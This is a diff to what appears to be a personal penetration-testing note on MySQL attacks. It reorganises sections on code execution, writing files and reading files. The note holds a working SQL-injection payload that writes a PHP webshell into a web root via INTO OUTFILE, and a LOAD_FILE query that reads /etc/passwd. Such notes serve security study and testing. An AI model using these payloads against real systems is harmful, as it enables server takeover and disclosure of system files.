@@ -58,9 +58,16 @@ Hint: in the mysql shell, end statements with `;`
 
 ## Code Execution
 
+e.g. use [[#Write File]] to place a webshell to a file and combine with [[2 Tech-Specifics/Web/Attacks - Web/File Inclusion|File Inclusion]]
+
+## Write File
+
 Use [SELECT INTO_OUTFILE](https://dev.mysql.com/doc/refman/8.0/en/select-into.html) to write the query result to a file
 
-- e.g. write a webshell to a file and combine with [[2 Tech-Specifics/Web/Attacks - Web/File Inclusion|File Inclusion]]
 - e.g.: `' UNION SELECT "<?php system($_GET['cmd']);?>", null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //`
+
+## Read File
+
+For example: `SELECT LOAD_FILE("/etc/passwd");`
 
 # Hardening
